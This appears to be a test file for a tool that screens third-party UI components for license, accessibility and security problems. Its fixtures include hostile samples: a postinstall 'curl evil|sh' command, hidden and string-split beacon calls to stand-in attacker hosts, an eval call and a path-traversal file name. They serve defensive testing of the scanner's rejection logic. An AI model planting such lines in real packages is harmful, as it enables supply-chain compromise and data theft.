@@ -1,0 +1,234 @@
+"""component-intake (WSF-E03) — negative fixtures ARE the DoD: unknown
+license REJECT, forbidden postinstall REJECT, hidden fetch REJECT,
+fixable no-reduced-motion ADAPT (never PASS), protected roots physically
+refused. All offline via --source-file."""
+from __future__ import annotations
+
+import json
+from pathlib import Path
+
+import pytest
+
+from singularity.intake.cli import main as intake_main
+
+
+def _item(tmp_path: Path, name: str, files: list[dict],
+          dependencies: list[str] | None = None) -> Path:
+    p = tmp_path / f"{name}.json"
+    p.write_text(json.dumps({"name": name, "type": "registry:component",
+                             "files": files,
+                             "dependencies": dependencies or []}),
+                 encoding="utf-8")
+    return p
+
+
+def _run(tmp_path, *argv):
+    import io
+    import sys as _sys
+    buf = io.StringIO()
+    old = _sys.stdout
+    _sys.stdout = buf
+    try:
+        rc = intake_main(["run", "--workspace", str(tmp_path / "ws"),
+                          "--json", *argv])
+    finally:
+        _sys.stdout = old
+    return rc, json.loads(buf.getvalue())
+
+
+MIT_HEADER = "/* MIT License — fixture */\n"
+ANIM = "export function Fx(){requestAnimationFrame(()=>{});return null}\n"
+REDUCED = "if(matchMedia('(prefers-reduced-motion: reduce)').matches){}\n"
+
+
+def test_no_reduced_motion_is_adapt_never_pass(tmp_path):
+    item = _item(tmp_path, "anim", [{"path": "Fx.jsx",
+                                     "content": MIT_HEADER + ANIM}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert rc == 1
+    assert env["verdict"]["result"] == "ADAPT"
+    assert any("prefers-reduced-motion" in r for r in env["data"]["requirements"])
+
+
+def test_reduced_motion_handled_still_adapt_v1_runtime_cap(tmp_path):
+    item = _item(tmp_path, "good", [{"path": "Fx.jsx",
+                                     "content": MIT_HEADER + ANIM + REDUCED}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert env["verdict"]["result"] == "ADAPT"  # v1 ceiling: runtime pending
+    assert env["data"]["checks"]["runtime"]["status"] == "unavailable"
+    assert not any("prefers-reduced-motion variant" in r
+                   for r in env["data"]["requirements"])
+
+
+def test_unknown_license_rejected(tmp_path):
+    item = _item(tmp_path, "nolic", [{"path": "Fx.jsx", "content": ANIM}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert rc == 1 and env["verdict"]["result"] == "REJECT"
+    assert any("license unknown" in r for r in env["data"]["reject_reasons"])
+
+
+def test_lifecycle_scripts_rejected(tmp_path):
+    pkg = json.dumps({"name": "x", "scripts": {"postinstall": "curl evil|sh"}})
+    item = _item(tmp_path, "scripted",
+                 [{"path": "Fx.jsx", "content": MIT_HEADER + "export default 1\n"},
+                  {"path": "package.json", "content": pkg}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert env["verdict"]["result"] == "REJECT"
+    assert any("lifecycle scripts" in r for r in env["data"]["reject_reasons"])
+
+
+def test_hidden_network_call_rejected(tmp_path):
+    code = MIT_HEADER + "fetch('https://evil.example/beacon')\n"
+    item = _item(tmp_path, "phone-home", [{"path": "Fx.jsx", "content": code}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert env["verdict"]["result"] == "REJECT"
+    assert any("evil.example" in r or "network" in r
+               for r in env["data"]["reject_reasons"])
+
+
+def test_eval_rejected(tmp_path):
+    code = MIT_HEADER + "const f = eval('1+1')\n"
+    item = _item(tmp_path, "evaler", [{"path": "Fx.jsx", "content": code}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert env["verdict"]["result"] == "REJECT"
+
+
+def test_allowlisted_font_host_not_rejected(tmp_path):
+    code = MIT_HEADER + "const u='https://fonts.googleapis.com/css2'\n"
+    item = _item(tmp_path, "fonts", [{"path": "Fx.css", "content": code}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    assert env["verdict"]["result"] != "REJECT"
+
+
+def test_workspace_protected_root_refused(tmp_path, monkeypatch):
+    guarded = tmp_path / "project"
+    monkeypatch.setenv("INTAKE_PROTECTED_ROOTS", str(guarded))
+    item = _item(tmp_path, "x", [{"path": "a.jsx",
+                                  "content": MIT_HEADER + "export default 1\n"}])
+    import io
+    import sys as _sys
+    buf = io.StringIO()
+    old = _sys.stdout
+    _sys.stdout = buf
+    try:
+        rc = intake_main(["run", "--source-file", str(item),
+                          "--workspace", str(guarded / "ws"), "--json"])
+    finally:
+        _sys.stdout = old
+    env = json.loads(buf.getvalue())
+    assert rc == 2 and "protected root" in env["error"]
+
+
+def test_provenance_chain_uses_record_license(tmp_path):
+    item = _item(tmp_path, "chained", [{"path": "Fx.jsx", "content": ANIM}])
+    cands = tmp_path / "candidates.json"
+    cands.write_text(json.dumps({"candidates": [{
+        "candidate_id": "react-bits/chained", "name": "chained",
+        "source_url": "https://x.example/", "license": "MIT + Commons Clause",
+        "dependencies": ["gsap"]}]}), encoding="utf-8")
+    rc, env = _run(tmp_path, "--source-file", str(item),
+                   "--candidates", str(cands), "--id", "react-bits/chained")
+    assert env["verdict"]["result"] == "ADAPT"  # licensed via record, animates
+    lic = env["data"]["checks"]["license"]
+    assert lic["license"] == "MIT + Commons Clause"
+    assert "E02" in lic["source"]
+    assert any("gsap" in r for r in env["data"]["requirements"])
+
+
+def test_dep_version_specifiers_normalized(tmp_path):
+    from singularity.intake.inspect import review_deps
+    out = review_deps(["gsap@^3.13.0", "@react-three/fiber@9.6.1", "leftpad"])
+    assert out["heavy"] == ["@react-three/fiber", "gsap"]
+
+
+_RUNTIME_ENV = all(map(__import__("os").environ.get,
+                       ("INTAKE_ESBUILD", "INTAKE_DEPS_ROOT",
+                        "INTAKE_PLAYWRIGHT_PROJECT")))
+
+
+@pytest.mark.skipif(not _RUNTIME_ENV,
+                    reason="runtime env (esbuild/deps/playwright) not configured")
+def test_runtime_phone_home_rejected_despite_static_miss(tmp_path):
+    # URL split across strings + Image().src: invisible to the static regex,
+    # caught by the network-quarantine runtime gate.
+    code = (MIT_HEADER + REDUCED
+            + "export default function Fx(){\n"
+              "  const i = new Image();\n"
+              "  i.src = 'ht' + 'tps://evil2.example/x.png';\n"
+              "  return null;\n}\n")
+    item = _item(tmp_path, "beacon", [{"path": "Fx.jsx", "content": code}])
+    rc, env = _run(tmp_path, "--source-file", str(item), "--runtime")
+    assert env["data"]["checks"]["static-scan"]["status"] == "ok"  # static missed it
+    assert env["verdict"]["result"] == "REJECT"
+    assert any("phones home" in r for r in env["data"]["reject_reasons"])
+
+
+@pytest.mark.skipif(not _RUNTIME_ENV,
+                    reason="runtime env (esbuild/deps/playwright) not configured")
+def test_runtime_clean_component_reaches_pass(tmp_path):
+    code = (MIT_HEADER + REDUCED
+            + "export default function Fx(){ return null; }\n")
+    item = _item(tmp_path, "cleanrt", [{"path": "Fx.jsx", "content": code}])
+    rc, env = _run(tmp_path, "--source-file", str(item), "--runtime")
+    assert env["data"]["checks"]["runtime"]["status"] == "ok", env["data"]["checks"]["runtime"]
+    assert env["verdict"]["result"] == "PASS" and rc == 0
+    assert env["data"]["checks"]["runtime"]["bundle"]["gzip_bytes"] > 0
+
+
+def test_recipe_scaffold_and_validation_gate(tmp_path):
+    # real intake report -> scaffold carries provenance facts, TODOs block
+    item = _item(tmp_path, "rcp", [{"path": "Fx.jsx",
+                                    "content": MIT_HEADER + ANIM}])
+    cands = tmp_path / "candidates.json"
+    cands.write_text(json.dumps({"candidates": [{
+        "candidate_id": "react-bits/rcp", "name": "rcp",
+        "source_url": "https://x.example/", "license": "MIT"}]}),
+        encoding="utf-8")
+    rc, env = _run(tmp_path, "--source-file", str(item),
+                   "--candidates", str(cands), "--id", "react-bits/rcp")
+    report_path = Path(env["outputs"][0])
+
+    rc2 = intake_main(["recipe", "--report", str(report_path),
+                       "--out", str(tmp_path / "recipe.json"), "--json"])
+    assert rc2 == 0
+    recipe = json.loads((tmp_path / "recipe.json").read_text("utf-8"))
+    assert recipe["candidate_id"] == "react-bits/rcp"
+    assert recipe["upstream"]["files"][0]["sha256"]
+    assert "prefers-reduced-motion" in recipe["reduced_motion"]
+
+    # draft with TODOs must FAIL validation (cannot enter implementation)
+    rc3 = intake_main(["recipe", "--validate", str(tmp_path / "recipe.json")])
+    assert rc3 == 1
+
+    # completing every TODO makes it PASS
+    for key, val in list(recipe.items()):
+        if isinstance(val, str) and val.startswith("TODO"):
+            recipe[key] = f"resolved: {key}"
+        if isinstance(val, dict):
+            for k, v in val.items():
+                if isinstance(v, str) and v.startswith("TODO"):
+                    val[k] = f"resolved: {k}"
+    (tmp_path / "recipe2.json").write_text(json.dumps(recipe), encoding="utf-8")
+    rc4 = intake_main(["recipe", "--validate", str(tmp_path / "recipe2.json")])
+    assert rc4 == 0
+
+
+def test_recipe_rejected_candidate_cannot_have_recipe(tmp_path):
+    from singularity.intake.recipe import scaffold_from_report, validate
+    report = {"provenance": {"candidate_id": "x/y", "origin": "https://x/"},
+              "checks": {"snapshot": {"files": [{"path": "a", "sha256": "ff"}]},
+                         "license": {"license": "unknown"}},
+              "requirements": [], "verdict": {"result": "REJECT"}}
+    recipe = scaffold_from_report(report)
+    problems = validate(recipe)
+    assert any("REJECT" in p for p in problems)
+
+
+def test_path_traversal_flattened(tmp_path):
+    item = _item(tmp_path, "sneaky",
+                 [{"path": "..\\..\\outside.jsx",
+                   "content": MIT_HEADER + "export default 1\n"}])
+    rc, env = _run(tmp_path, "--source-file", str(item))
+    ws = Path(env["inputs"]["workspace"])
+    assert (ws / "src" / "outside.jsx").is_file()
+    assert not (tmp_path / "outside.jsx").exists()
